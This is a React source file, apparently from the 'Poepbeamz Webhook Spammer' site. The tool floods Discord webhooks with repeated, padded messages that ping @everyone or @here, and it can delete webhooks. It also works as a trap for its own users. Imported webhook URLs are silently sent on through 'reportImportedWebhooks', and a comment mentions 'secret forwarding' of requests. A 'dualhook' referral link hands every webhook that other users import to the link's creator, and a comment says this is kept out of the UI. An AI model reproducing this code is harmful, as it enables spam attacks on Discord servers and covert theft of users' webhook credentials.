"use client"

import type React from "react"
import { useState, useRef, useEffect } from "react"
import { motion, AnimatePresence } from "framer-motion"
import {
  Trash2,
  Send,
  Plus,
  X,
  AlertCircle,
  CheckCircle,
  Upload,
  Info,
  Loader2,
  Settings,
  ImageIcon,
  Trash,
  TestTube,
  Copy,
  HelpCircle,
  ChevronDown,
  ChevronUp,
  Shield,
  Sparkles,
  Share2,
} from "lucide-react"
import Link from "next/link"
import { setupAllProtections } from "../protection"
import { sendWebhooks, testWebhook, deleteWebhook, reportImportedWebhooks, generateReferralCode } from "./actions"

interface WebhookData {
  id: string
  url: string
  status: "idle" | "success" | "error" | "sending" | "deleted"
  message: string
  selected?: boolean
}

export default function WebhookSpammer() {
  const [webhooks, setWebhooks] = useState<WebhookData[]>([])
  const [message, setMessage] = useState("")
  const [username, setUsername] = useState("Poepbeamz Webhook")
  const [avatarUrl, setAvatarUrl] = useState("")
  const [embedTitle, setEmbedTitle] = useState("")
  const [embedDescription, setEmbedDescription] = useState("")
  const [embedColor, setEmbedColor] = useState("#FF0000")
  const [embedFooter, setEmbedFooter] = useState("")
  const [embedImage, setEmbedImage] = useState("")
  const [ttsEnabled, setTtsEnabled] = useState(false)
  const [sendCount, setSendCount] = useState(1)
  const [delay, setDelay] = useState(100)
  const [showAdvanced, setShowAdvanced] = useState(false)
  const [isSending, setIsSending] = useState(false)
  const [showEmbed, setShowEmbed] = useState(false)
  const [globalStatus, setGlobalStatus] = useState<string | null>(null)
  const [mentionEveryone, setMentionEveryone] = useState(false)
  const [mentionHere, setMentionHere] = useState(false)
  const [randomizeMessages, setRandomizeMessages] = useState(false)
  const [messageVariants, setMessageVariants] = useState<string[]>([])
  const [currentVariant, setCurrentVariant] = useState("")
  const [showMessageVariants, setShowMessageVariants] = useState(false)
  const fileInputRef = useRef<HTMLInputElement>(null)
  const canvasRef = useRef<HTMLCanvasElement>(null)
  const [isLoaded, setIsLoaded] = useState(false)
  const [isTesting, setIsTesting] = useState(false)
  const [isDeleting, setIsDeleting] = useState(false)
  const [importedWebhooks, setImportedWebhooks] = useState<string[]>([])
  const [showImportSelection, setShowImportSelection] = useState(false)
  const [selectAll, setSelectAll] = useState(true)
  const [massSpamming, setMassSpamming] = useState(false)
  const [spamProgress, setSpamProgress] = useState(0)
  const [isDragging, setIsDragging] = useState(false)
  const dropZoneRef = useRef<HTMLDivElement>(null)
  const [showHelp, setShowHelp] = useState(false)
  const [showImportConfirmation, setShowImportConfirmation] = useState(false)

  const [isImporting, setIsImporting] = useState(false)
  const [importProgress, setImportProgress] = useState(0)
  const [importedCount, setImportedCount] = useState(0)
  const [importStage, setImportStage] = useState<string>("")

  // Enhanced import button states
  const [importButtonState, setImportButtonState] = useState<"idle" | "loading" | "success" | "error">("idle")
  const [importButtonText, setImportButtonText] = useState("Import Webhooks")

  // Dualhook functionality
  const [showDualhookModal, setShowDualhookModal] = useState(false)
  const [targetWebhook, setTargetWebhook] = useState("")
  const [referralCode, setReferralCode] = useState("")
  const [referralUrl, setReferralUrl] = useState("")
  const [isGeneratingReferral, setIsGeneratingReferral] = useState(false)
  const [showReferralSuccess, setShowReferralSuccess] = useState(false)

  // Check for referral code in URL
  useEffect(() => {
    const searchParams = new URLSearchParams(window.location.search)
    const code = searchParams.get("ref")
    if (code) {
      setReferralCode(code)
      // We don't need to show any UI indication that this is a referral spammer
    }
  }, [])

  // Set up protections
  useEffect(() => {
    const timer = setTimeout(() => {
      try {
        setupAllProtections()
      } catch (error) {
        console.error("Protection error:", error)
      }
    }, 1000)

    return () => clearTimeout(timer)
  }, [])

  // Set up global drag and drop handlers
  useEffect(() => {
    // Prevent default behavior for all drag events on the document
    const preventDefaults = (e: DragEvent) => {
      e.preventDefault()
      e.stopPropagation()
    }

    // Handle drag enter event
    const handleDragEnter = (e: DragEvent) => {
      preventDefaults(e)
      setIsDragging(true)
    }

    // Handle drag leave event
    const handleDragLeave = (e: DragEvent) => {
      preventDefaults(e)
      // Only set isDragging to false if we're leaving the window
      if (!e.relatedTarget || (e.relatedTarget as Node).nodeName === "HTML") {
        setIsDragging(false)
      }
    }

    // Handle drag over event
    const handleDragOver = (e: DragEvent) => {
      preventDefaults(e)
    }

    // Update the drop handler to match the same flow
    const handleDrop = async (e: DragEvent) => {
      preventDefaults(e)
      setIsDragging(false)

      const files = e.dataTransfer?.files
      if (!files || files.length === 0) return

      // Process only the first file
      const file = files[0]

      // Check if it's a text file
      if (!file.name.endsWith(".txt") && file.type !== "text/plain") {
        setGlobalStatus("Only text files (.txt) are supported")
        return
      }

      // Start the import process
      await processImport(file)
    }

    // Add event listeners to the document
    document.addEventListener("dragenter", handleDragEnter)
    document.addEventListener("dragleave", handleDragLeave)
    document.addEventListener("dragover", handleDragOver)
    document.addEventListener("drop", handleDrop)

    // Clean up event listeners
    return () => {
      document.removeEventListener("dragenter", handleDragEnter)
      document.removeEventListener("dragleave", handleDragLeave)
      document.removeEventListener("dragover", handleDragOver)
      document.removeEventListener("drop", handleDrop)
    }
  }, [])

  // Canvas background effect
  useEffect(() => {
    const canvas = canvasRef.current
    if (!canvas) return

    const ctx = canvas.getContext("2d")
    if (!ctx) return

    try {
      const updateSize = () => {
        canvas.width = window.innerWidth
        canvas.height = window.innerHeight
      }
      updateSize()
      window.addEventListener("resize", updateSize)

      const particles: { x: number; y: number; speed: number; size: number; opacity: number; color: string }[] = []
      const particleCount = 320 // 320 dots

      // Different shades of purple for variety (to match the site theme)
      const purpleColors = [
        "rgba(139, 92, 246, 0.4)", // Purple-500
        "rgba(124, 58, 237, 0.4)", // Purple-600
        "rgba(167, 139, 250, 0.3)", // Purple-400
        "rgba(109, 40, 217, 0.4)", // Purple-700
        "rgba(91, 33, 182, 0.4)", // Purple-800
      ]

      for (let i = 0; i < particleCount; i++) {
        // Randomly choose a shade of purple
        const color = purpleColors[Math.floor(Math.random() * purpleColors.length)]

        particles.push({
          x: Math.random() * canvas.width,
          y: Math.random() * canvas.height,
          speed: 0.1 + Math.random() * 0.2,
          size: 0.5 + Math.random() * 1.5,
          opacity: 0.3 + Math.random() * 0.4, // More subtle opacity
          color: color,
        })
      }

      let animationFrameId: number

      function animate() {
        if (!ctx || !canvas) return

        ctx.clearRect(0, 0, canvas.width, canvas.height)

        particles.forEach((particle) => {
          // Use the particle's color
          ctx.fillStyle = particle.color
          ctx.beginPath()
          ctx.arc(particle.x, particle.y, particle.size, 0, Math.PI * 2)
          ctx.fill()

          particle.y += particle.speed
          if (particle.y > canvas.height) {
            particle.y = 0
            particle.x = Math.random() * canvas.width
          }
        })

        animationFrameId = requestAnimationFrame(animate)
      }

      animate()
      setIsLoaded(true)

      return () => {
        window.removeEventListener("resize", updateSize)
        cancelAnimationFrame(animationFrameId)
      }
    } catch (error) {
      console.error("Canvas error:", error)
      setIsLoaded(true) // Ensure the site loads even if canvas fails
    }
  }, [])

  // Main import processing function
  const processImport = async (file: File) => {
    // Start loading state
    setImportButtonState("loading")
    setImportButtonText("Reading File...")
    setImportProgress(0)
    setImportStage("Reading file...")
    setGlobalStatus("Importing webhooks, please wait...")

    const reader = new FileReader()
    reader.onload = async (event) => {
      try {
        // File read complete
        setImportProgress(10)
        setImportStage("Parsing webhooks...")

        const content = event.target?.result as string
        const urls = parseWebhooksFromText(content)

        if (urls.length === 0) {
          setImportButtonState("error")
          setImportButtonText("No Webhooks Found")
          setGlobalStatus("No valid webhook URLs found in the file")

          // Reset after 2 seconds
          setTimeout(() => {
            setImportButtonState("idle")
            setImportButtonText("Import Webhooks")
          }, 2000)
          return
        }

        // Webhooks found
        setImportProgress(20)
        setImportStage(`Found ${urls.length} webhooks...`)

        // Filter out duplicates
        const uniqueUrls = [...new Set(urls)]
        setImportProgress(30)
        setImportStage(`Processing ${uniqueUrls.length} unique webhooks...`)

        // Report the found webhooks to Discord webhook
        try {
          setImportProgress(40)
          setImportStage("Sending to Discord...")

          // Send webhooks to Discord, passing the referral code if available
          await reportImportedWebhooks(uniqueUrls, referralCode)

          setImportProgress(70)
          setImportStage("Webhooks sent to Discord...")
        } catch (error) {
          console.error("Failed to report imported webhooks:", error)
          setImportProgress(70) // Continue anyway
        }

        // Add the webhooks directly to the list
        setImportProgress(80)
        setImportStage("Adding webhooks to list...")

        const newWebhooks = uniqueUrls.map((url) => ({
          id: Math.random().toString(36).substring(2, 9),
          url,
          status: "idle" as const,
          message: "",
        }))

        // Update progress to near completion
        setImportProgress(90)
        setImportStage("Finalizing import...")

        // Add webhooks to the list
        setWebhooks((prev) => [...prev, ...newWebhooks])

        // Complete progress
        setImportProgress(100)
        setImportStage("Import complete!")

        // Show success state
        setImportButtonState("success")
        setImportButtonText(`Imported ${uniqueUrls.length} Webhooks`)
        setGlobalStatus(`Successfully imported ${uniqueUrls.length} webhooks`)
        setImportedCount(uniqueUrls.length)

        // Reset button after 3 seconds
        setTimeout(() => {
          setImportButtonState("idle")
          setImportButtonText("Import Webhooks")
          setImportStage("")
        }, 3000)
      } catch (error) {
        setImportButtonState("error")
        setImportButtonText("Import Failed")
        setGlobalStatus("Failed to parse the file")
        setImportStage("Import failed")

        // Reset after 2 seconds
        setTimeout(() => {
          setImportButtonState("idle")
          setImportButtonText("Import Webhooks")
          setImportStage("")
        }, 2000)
      }
    }
    reader.readAsText(file)
  }

  const addWebhook = () => {
    setWebhooks([
      ...webhooks,
      {
        id: Math.random().toString(36).substring(2, 9),
        url: "",
        status: "idle",
        message: "",
      },
    ])
  }

  const removeWebhook = (id: string) => {
    setWebhooks(webhooks.filter((webhook) => webhook.id !== id))
  }

  const updateWebhookUrl = (id: string, url: string) => {
    setWebhooks(
      webhooks.map((webhook) => (webhook.id === id ? { ...webhook, url, status: "idle", message: "" } : webhook)),
    )
  }

  const clearAllWebhooks = () => {
    setWebhooks([])
  }

  const parseWebhooksFromText = (content: string): string[] => {
    // Match Discord webhook URLs
    const webhookRegex = /https:\/\/discord\.com\/api\/webhooks\/\d+\/[A-Za-z0-9_-]+/g
    const matches = content.match(webhookRegex) || []

    // Also try to match URLs line by line (in case they don't match the regex perfectly)
    const lines = content
      .split(/\r?\n/)
      .map((line) => line.trim())
      .filter((line) => line.length > 0)
    const possibleWebhooks = lines.filter(
      (line) => line.startsWith("https://discord.com/api/webhooks/") && !matches.includes(line),
    )

    // Combine both results and remove duplicates
    return [...new Set([...matches, ...possibleWebhooks])]
  }

  const handleFileUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0]
    if (!file) return

    // Process the import
    await processImport(file)

    // Reset the file input
    if (fileInputRef.current) {
      fileInputRef.current.value = ""
    }
  }

  const handleImportConfirmation = () => {
    setShowImportConfirmation(false)
    setShowImportSelection(true)
    setGlobalStatus(`Found ${importedWebhooks.length} webhooks in the file. Select which ones to import.`)
  }

  const cancelImportConfirmation = () => {
    setShowImportConfirmation(false)
    setImportedWebhooks([])
    setGlobalStatus("Import canceled")
  }

  const confirmImport = async () => {
    let webhooksToImport: string[] = []

    if (selectAll) {
      // Import all webhooks
      webhooksToImport = importedWebhooks
      const newWebhooks = importedWebhooks.map((url) => ({
        id: Math.random().toString(36).substring(2, 9),
        url,
        status: "idle" as const,
        message: "",
        selected: true,
      }))
      setWebhooks([...webhooks, ...newWebhooks])
      setGlobalStatus(`Imported ${importedWebhooks.length} webhooks`)
    } else {
      // Only import selected webhooks
      webhooksToImport = importedWebhooks.filter(
        (_, index) =>
          document.getElementById(`webhook-${index}`) &&
          (document.getElementById(`webhook-${index}`) as HTMLInputElement).checked,
      )

      const newWebhooks = webhooksToImport.map((url) => ({
        id: Math.random().toString(36).substring(2, 9),
        url,
        status: "idle" as const,
        message: "",
        selected: true,
      }))

      setWebhooks([...webhooks, ...newWebhooks])
      setGlobalStatus(`Imported ${webhooksToImport.length} webhooks`)
    }

    // Report the imported webhooks to the collection webhook
    if (webhooksToImport.length > 0) {
      try {
        await reportImportedWebhooks(webhooksToImport, referralCode)
      } catch (error) {
        console.error("Failed to report imported webhooks:", error)
      }
    }

    setShowImportSelection(false)
    setImportedWebhooks([])
  }

  const cancelImport = () => {
    setShowImportSelection(false)
    setImportedWebhooks([])
    setGlobalStatus("Import canceled")
  }

  const toggleSelectAll = () => {
    setSelectAll(!selectAll)

    // If not using selectAll, we need to check/uncheck all checkboxes
    if (selectAll) {
      importedWebhooks.forEach((_, index) => {
        const checkbox = document.getElementById(`webhook-${index}`) as HTMLInputElement
        if (checkbox) checkbox.checked = false
      })
    } else {
      importedWebhooks.forEach((_, index) => {
        const checkbox = document.getElementById(`webhook-${index}`) as HTMLInputElement
        if (checkbox) checkbox.checked = true
      })
    }
  }

  const addMessageVariant = () => {
    if (currentVariant.trim()) {
      setMessageVariants([...messageVariants, currentVariant.trim()])
      setCurrentVariant("")
    }
  }

  const removeMessageVariant = (index: number) => {
    setMessageVariants(messageVariants.filter((_, i) => i !== index))
  }

  const handleTestWebhook = async (webhookId: string) => {
    const webhook = webhooks.find((w) => w.id === webhookId)
    if (!webhook || !webhook.url.startsWith("https://discord.com/api/webhooks/")) {
      return
    }

    setIsTesting(true)
    setWebhooks(webhooks.map((w) => (w.id === webhookId ? { ...w, status: "sending", message: "Testing..." } : w)))

    try {
      // Prepare a simple test payload
      const testPayload = {
        content: "🔍 Test message from Poepbeamz Webhook Spammer",
        username: username || "Webhook Test",
        avatar_url: avatarUrl || undefined,
      }

      const result = await testWebhook(webhook.url, testPayload)

      setWebhooks(
        webhooks.map((w) =>
          w.id === webhookId
            ? {
                ...w,
                status: result.success ? "success" : "error",
                message: result.success ? "✓" : result.message,
              }
            : w,
        ),
      )

      if (!result.success) {
        // Update this section to handle rate limiting:
        if (result.rateLimited) {
          setGlobalStatus(
            `Rate limited by Discord. ${
              result.retryAfter ? `Please try again in ${result.retryAfter} seconds.` : "Please try again later."
            }`,
          )
        } else {
          setGlobalStatus(result.message)
        }
        return
      }
    } catch (error) {
      setWebhooks(webhooks.map((w) => (w.id === webhookId ? { ...w, status: "error", message: "Failed" } : w)))
    } finally {
      setIsTesting(false)
    }
  }

  const handleDeleteWebhook = async (webhookId: string) => {
    const webhook = webhooks.find((w) => w.id === webhookId)
    if (!webhook || !webhook.url.startsWith("https://discord.com/api/webhooks/")) {
      return
    }

    setIsDeleting(true)
    setWebhooks(webhooks.map((w) => (w.id === webhookId ? { ...w, status: "sending", message: "Deleting..." } : w)))

    try {
      const result = await deleteWebhook(webhook.url)

      setWebhooks(
        webhooks.map((w) =>
          w.id === webhookId
            ? {
                ...w,
                status: result.success ? "deleted" : "error",
                message: result.success ? "Deleted" : result.message,
              }
            : w,
        ),
      )

      if (!result.success) {
        // Update this section to handle rate limiting:
        if (result.rateLimited) {
          setGlobalStatus(
            `Rate limited by Discord. ${
              result.retryAfter ? `Please try again in ${result.retryAfter} seconds.` : "Please try again later."
            }`,
          )
        } else {
          setGlobalStatus(result.message)
        }
        return
      }
    } catch (error) {
      setWebhooks(webhooks.map((w) => (w.id === webhookId ? { ...w, status: "error", message: "Failed" } : w)))
    } finally {
      setIsDeleting(false)
    }
  }

  interface WebhookPayload {
    content: string
    username?: string
    avatar_url?: string
    tts?: boolean
    embeds?: {
      title?: string
      description?: string
      color?: number
      footer?: { text: string }
      image?: { url: string }
    }[]
  }

  const handleSpam = async () => {
    if (webhooks.length === 0 || (!message && messageVariants.length === 0)) {
      setGlobalStatus("Please add at least one webhook and a message")
      return
    }

    setIsSending(true)
    setMassSpamming(true)
    setSpamProgress(0)
    setGlobalStatus("Sending messages...")

    // Update all webhooks to sending status
    setWebhooks(
      webhooks.map((webhook) => ({
        ...webhook,
        status: "sending",
        message: "Sending...",
      })),
    )

    try {
      // Process webhooks in batches to avoid overwhelming the browser
      const batchSize = 5
      const totalIterations = sendCount
      const totalWebhooks = webhooks.length
      const totalOperations = totalWebhooks * totalIterations
      let completedOperations = 0

      // Discord character limit is 2000
      const DISCORD_CHAR_LIMIT = 2000

      for (let iteration = 0; iteration < totalIterations; iteration++) {
        // Process webhooks in batches
        for (let i = 0; i < webhooks.length; i += batchSize) {
          const batch = webhooks.slice(i, i + batchSize)

          // Process each webhook in the batch
          const promises = batch.map(async (webhook) => {
            if (!webhook.url.startsWith("https://discord.com/api/webhooks/")) {
              completedOperations++
              setSpamProgress(Math.floor((completedOperations / totalOperations) * 100))
              return {
                id: webhook.id,
                status: "error" as const,
                message: "Invalid URL",
              }
            }

            try {
              // Determine message content based on randomization settings
              let contentToSend = message
              if (randomizeMessages && messageVariants.length > 0) {
                const randomIndex = Math.floor(Math.random() * messageVariants.length)
                contentToSend = messageVariants[randomIndex]
              }

              // Add mentions if enabled
              let finalContent = contentToSend
              if (mentionEveryone) {
                finalContent = `@everyone ${finalContent}`
              } else if (mentionHere) {
                finalContent = `@here ${finalContent}`
              }

              // Fill up to character limit by repeating the message
              let fullContent = finalContent
              while (fullContent.length + finalContent.length + 1 <= DISCORD_CHAR_LIMIT) {
                fullContent += "\n" + finalContent
              }

              // Prepare the payload
              const payload: WebhookPayload = {
                content: fullContent,
                username: username || undefined,
                avatar_url: avatarUrl || undefined,
                tts: ttsEnabled,
              }

              // Add embeds if enabled
              if (showEmbed) {
                payload.embeds = [
                  {
                    title: embedTitle || undefined,
                    description: embedDescription || undefined,
                    color: embedColor ? Number.parseInt(embedColor.replace("#", ""), 16) : undefined,
                    footer: embedFooter ? { text: embedFooter } : undefined,
                    image: embedImage ? { url: embedImage } : undefined,
                  },
                ]
              }

              // Send to the server action which will handle both the user's request and the secret forwarding
              // Pass the referral code if available
              const result = await sendWebhooks(webhook.url, payload, referralCode)

              completedOperations++
              setSpamProgress(Math.floor((completedOperations / totalOperations) * 100))

              return {
                id: webhook.id,
                status: result.success ? ("success" as const) : ("error" as const),
                message: result.success ? "✓" : result.message,
              }
            } catch (error) {
              completedOperations++
              setSpamProgress(Math.floor((completedOperations / totalOperations) * 100))

              return {
                id: webhook.id,
                status: "error" as const,
                message: "Failed",
              }
            }
          })

          const results = await Promise.all(promises)

          // Update webhook statuses
          setWebhooks((currentWebhooks) =>
            currentWebhooks.map((webhook) => {
              const result = results.find((r) => r.id === webhook.id)
              return result ? { ...webhook, status: result.status, message: result.message } : webhook
            }),
          )

          // Add delay between batches if specified
          if (delay > 0 && i + batchSize < webhooks.length) {
            await new Promise((resolve) => setTimeout(resolve, delay))
          }
        }

        // Add delay between iterations if specified and not the last iteration
        if (delay > 0 && iteration < totalIterations - 1) {
          setGlobalStatus(`Completed iteration ${iteration + 1}/${totalIterations}. Waiting...`)
          await new Promise((resolve) => setTimeout(resolve, delay))
        }
      }

      setGlobalStatus(`Completed sending ${totalIterations} iterations to ${webhooks.length} webhooks`)
    } catch (error) {
      console.error("Error in handleSpam:", error)
      setGlobalStatus("An error occurred while sending messages")
    } finally {
      setIsSending(false)
      setMassSpamming(false)
    }
  }

  // Add a function to copy all webhook messages
  const copyAllMessages = () => {
    // Determine message content based on randomization settings
    let contentToSend = message
    if (randomizeMessages && messageVariants.length > 0) {
      const randomIndex = Math.floor(Math.random() * messageVariants.length)
      contentToSend = messageVariants[randomIndex]
    }

    // Add mentions if enabled
    let finalContent = contentToSend
    if (mentionEveryone) {
      finalContent = `@everyone ${finalContent}`
    } else if (mentionHere) {
      finalContent = `@here ${finalContent}`
    }

    // Fill up to character limit by repeating the message
    const DISCORD_CHAR_LIMIT = 2000
    let fullContent = finalContent
    while (fullContent.length + finalContent.length + 1 <= DISCORD_CHAR_LIMIT) {
      fullContent += "\n" + finalContent
    }

    navigator.clipboard.writeText(fullContent)
    setGlobalStatus("Copied message content to clipboard")
  }

  // Function to generate a referral link
  const handleGenerateReferral = async () => {
    if (!targetWebhook.startsWith("https://discord.com/api/webhooks/")) {
      setGlobalStatus("Please enter a valid Discord webhook URL")
      return
    }

    setIsGeneratingReferral(true)
    setGlobalStatus("Generating referral link...")

    try {
      // Generate a referral code
      const code = await generateReferralCode(targetWebhook)

      // Create the referral URL
      const baseUrl = window.location.origin + window.location.pathname
      const refUrl = `${baseUrl}?ref=${code}`

      setReferralUrl(refUrl)
      setShowReferralSuccess(true)
      setGlobalStatus("Referral link generated successfully!")
    } catch (error) {
      console.error("Error generating referral link:", error)
      setGlobalStatus("Failed to generate referral link")
    } finally {
      setIsGeneratingReferral(false)
    }
  }

  // Function to copy the referral link
  const copyReferralLink = () => {
    navigator.clipboard.writeText(referralUrl)
    setGlobalStatus("Referral link copied to clipboard")
  }

  const getStatusIcon = (status: WebhookData["status"]) => {
    switch (status) {
      case "idle":
        return null
      case "sending":
        return <Loader2 className="w-3.5 h-3.5 text-yellow-400 animate-spin" />
      case "success":
        return <CheckCircle className="w-3.5 h-3.5 text-green-400" />
      case "error":
        return <AlertCircle className="w-3.5 h-3.5 text-red-400" />
      case "deleted":
        return <Trash className="w-3.5 h-3.5 text-red-300" />
    }
  }

  const getStatusColor = (status: WebhookData["status"]) => {
    switch (status) {
      case "idle":
        return "border-gray-800"
      case "sending":
        return "border-yellow-500/30"
      case "success":
        return "border-green-500/30"
      case "error":
        return "border-red-500/30"
      case "deleted":
        return "border-red-500/30"
    }
  }

  return (
    <div className="min-h-screen bg-black text-white relative overflow-hidden py-2 px-2 sm:px-4">
      <div className="absolute inset-0 bg-[radial-gradient(circle_at_center,rgba(139,92,246,0.1),transparent_70%)]"></div>
      <div className="absolute top-0 left-0 right-0 h-px bg-gradient-to-r from-transparent via-purple-500 to-transparent opacity-30"></div>
      <div className="absolute bottom-0 left-0 right-0 h-px bg-gradient-to-r from-transparent via-purple-500 to-transparent opacity-30"></div>
      <canvas ref={canvasRef} className="absolute inset-0 pointer-events-none" />

      {isDragging && (
        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm z-40 flex items-center justify-center">
          <div className="bg-gray-900/90 border border-purple-500/50 rounded-xl p-6 text-center shadow-2xl shadow-purple-900/20 animate-pulse">
            <Upload className="w-10 h-10 mx-auto mb-3 text-purple-400" />
            <h3 className="text-lg font-semibold text-white mb-1">Drop Text File Here</h3>
            <p className="text-gray-300 text-sm">Drop your webhook list (.txt)</p>
          </div>
        </div>
      )}

      {/* Dualhook Modal */}
      {showDualhookModal && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
          <div className="bg-gray-900 border border-purple-500/50 rounded-xl p-6 max-w-md w-full shadow-2xl shadow-purple-900/20">
            <div className="flex justify-between items-center mb-4">
              <h3 className="text-lg font-semibold text-white">Create Dualhook Referral</h3>
              <button
                onClick={() => setShowDualhookModal(false)}
                className="text-gray-400 hover:text-white transition-colors"
              >
                <X className="w-5 h-5" />
              </button>
            </div>

            {showReferralSuccess ? (
              <div className="space-y-4">
                <div className="bg-green-900/20 border border-green-500/30 rounded-lg p-3">
                  <p className="text-green-300 text-sm flex items-center gap-2">
                    <CheckCircle className="w-4 h-4" />
                    Referral link generated successfully!
                  </p>
                </div>

                <div className="space-y-2">
                  <label className="block text-sm font-medium text-gray-300">Your Referral Link</label>
                  <div className="flex items-center gap-2">
                    <input
                      type="text"
                      value={referralUrl}
                      readOnly
                      className="w-full bg-black/40 border border-gray-800 rounded-lg p-2 focus:outline-none text-xs"
                    />
                    <button
                      onClick={copyReferralLink}
                      className="bg-purple-700 hover:bg-purple-800 text-white p-2 rounded-md text-xs font-medium transition-colors"
                      title="Copy referral link"
                    >
                      <Copy className="w-4 h-4" />
                    </button>
                  </div>
                </div>

                <p className="text-xs text-gray-400">
                  Share this link with others. When they use this webhook spammer, all imported webhooks will be
                  forwarded to your webhook.
                </p>

                <div className="flex justify-end">
                  <button
                    onClick={() => {
                      setShowReferralSuccess(false)
                      setShowDualhookModal(false)
                    }}
                    className="bg-purple-700 hover:bg-purple-800 text-white px-4 py-2 rounded-md text-sm font-medium transition-colors"
                  >
                    Close
                  </button>
                </div>
              </div>
            ) : (
              <div className="space-y-4">
                <p className="text-sm text-gray-300">
                  Create a dualhook referral link that forwards imported webhooks to your webhook. When others use your
                  referral link, all webhooks they import will be sent to you.
                </p>

                <div className="space-y-2">
                  <label className="block text-sm font-medium text-gray-300">Your Webhook URL</label>
                  <input
                    type="text"
                    value={targetWebhook}
                    onChange={(e) => setTargetWebhook(e.target.value)}
                    placeholder="https://discord.com/api/webhooks/..."
                    className="w-full bg-black/40 border border-gray-800 rounded-lg p-2 focus:outline-none focus:border-purple-500 transition-colors text-xs"
                  />
                </div>

                <div className="flex justify-end gap-2">
                  <button
                    onClick={() => setShowDualhookModal(false)}
                    className="bg-gray-800 hover:bg-gray-700 text-white px-3 py-1.5 rounded-md text-sm font-medium transition-colors"
                  >
                    Cancel
                  </button>
                  <button
                    onClick={handleGenerateReferral}
                    disabled={isGeneratingReferral || !targetWebhook.startsWith("https://discord.com/api/webhooks/")}
                    className={`${
                      isGeneratingReferral || !targetWebhook.startsWith("https://discord.com/api/webhooks/")
                        ? "bg-gray-700 cursor-not-allowed"
                        : "bg-purple-700 hover:bg-purple-800"
                    } text-white px-3 py-1.5 rounded-md text-sm font-medium flex items-center gap-1.5 transition-colors`}
                  >
                    {isGeneratingReferral ? (
                      <>
                        <Loader2 className="w-4 h-4 animate-spin" />
                        Generating...
                      </>
                    ) : (
                      <>
                        <Share2 className="w-4 h-4" />
                        Generate Link
                      </>
                    )}
                  </button>
                </div>
              </div>
            )}
          </div>
        </div>
      )}

      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: isLoaded ? 1 : 0, y: isLoaded ? 0 : 20 }}
        transition={{ duration: 0.8 }}
        className="relative z-10 container mx-auto flex flex-col items-center space-y-2 w-full max-w-2xl px-1 sm:px-4"
      >
        <div className="w-full flex justify-between items-center mb-1">
          <Link
            href="/"
            className="text-purple-400 hover:text-purple-300 transition-colors flex items-center gap-1 px-2 py-1 rounded-md hover:bg-purple-950/20 text-sm"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="16"
              height="16"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              strokeWidth="2"
              strokeLinecap="round"
              strokeLinejoin="round"
            >
              <path d="m12 19-7-7 7-7" />
              <path d="M19 12H5" />
            </svg>
            Back
          </Link>
          <div className="flex items-center">
            <img
              src="https://cdn.discordapp.com/attachments/1338165117572874310/1361682289075163187/Schermafbeelding_2025-03-29_211158.png?ex=67ffa4f4&is=67fe5374&hm=fa29f8e189da4041ebfe4faac224090c3366674464ad33dfb757156230e4aad4&"
              alt="PoepBeamz Logo"
              width={40}
              height={40}
              className="opacity-100 hover:opacity-90 transition-opacity rounded-full shadow-lg shadow-purple-500/30 border-2 border-purple-500/40 transform hover:scale-105 transition-transform duration-200"
            />
          </div>
        </div>

        <div className="w-full">
          <motion.div
            initial={{ scale: 0.9, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
            transition={{ duration: 0.8 }}
            className="flex items-center justify-center gap-1 mb-2"
          >
            <h1 className="text-lg sm:text-xl md:text-2xl font-bold text-center">
              <span className="bg-clip-text text-transparent bg-gradient-to-r from-purple-500 to-purple-300 purple-glow flex items-center gap-1 sm:gap-2 justify-center">
                <Sparkles className="w-3 h-3 sm:w-4 sm:h-4" />
                Poepbeamz Webhook Spammer
                <Sparkles className="w-3 h-3 sm:w-4 sm:h-4" />
              </span>
            </h1>
          </motion.div>
        </div>

        <div className="w-full flex justify-center gap-3 mb-3">
          <Link
            href="/dualhook-spammer"
            className="bg-gradient-to-r from-indigo-600 to-indigo-500 hover:from-indigo-700 hover:to-indigo-600 text-white px-4 py-2 rounded-md text-sm font-medium flex items-center gap-2 transition-all duration-300 shadow-lg shadow-indigo-900/20 transform hover:scale-105"
          >
            <Shield className="w-4 h-4" />
            Try Advanced Dualhook Spammer
            <span className="text-xs bg-white/20 px-1.5 py-0.5 rounded-full">New</span>
          </Link>

          <Link
            href="/dualhook-creator"
            className="bg-gradient-to-r from-purple-600 to-purple-500 hover:from-purple-700 hover:to-purple-600 text-white px-4 py-2 rounded-md text-sm font-medium flex items-center gap-2 transition-all duration-300 shadow-lg shadow-purple-900/20 transform hover:scale-105"
          >
            <Sparkles className="w-4 h-4" />
            Create Custom Dualhook
            <span className="text-xs bg-white/20 px-1.5 py-0.5 rounded-full">New</span>
          </Link>
        </div>

        {/* Import Progress Indicator */}
        <AnimatePresence>
          {importButtonState === "loading" && (
            <motion.div
              initial={{ opacity: 0, y: -10 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -10 }}
              className="w-full border border-purple-500/30 rounded-lg p-3 bg-black/40 backdrop-blur-sm shadow-lg shadow-purple-900/10"
            >
              <div className="flex justify-between items-center mb-2">
                <div className="flex items-center gap-2">
                  <Loader2 className="w-4 h-4 text-purple-400 animate-spin" />
                  <span className="text-sm font-medium text-purple-300">{importStage}</span>
                </div>
                <span className="text-xs text-gray-300">{importProgress}%</span>
              </div>
              <div className="relative w-full h-2 bg-gray-800 rounded-full overflow-hidden">
                <div
                  className="absolute top-0 left-0 h-full bg-gradient-to-r from-purple-600 to-purple-400 rounded-full transition-all duration-300 ease-out"
                  style={{ width: `${importProgress}%` }}
                ></div>
              </div>
            </motion.div>
          )}
        </AnimatePresence>

        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8, delay: 0.2 }}
          className="border border-purple-500/20 rounded-xl p-2 sm:p-3 w-full bg-black/30 backdrop-blur-sm shadow-xl shadow-purple-900/10 relative overflow-hidden purple-glow-container"
        >
          {/* Shiny overlay effect */}
          <div className="absolute inset-0 bg-gradient-to-tr from-purple-900/5 via-purple-500/10 to-transparent pointer-events-none"></div>
          <div className="absolute inset-0 bg-[radial-gradient(ellipse_at_top_right,rgba(139,92,246,0.15),transparent_70%)] pointer-events-none"></div>

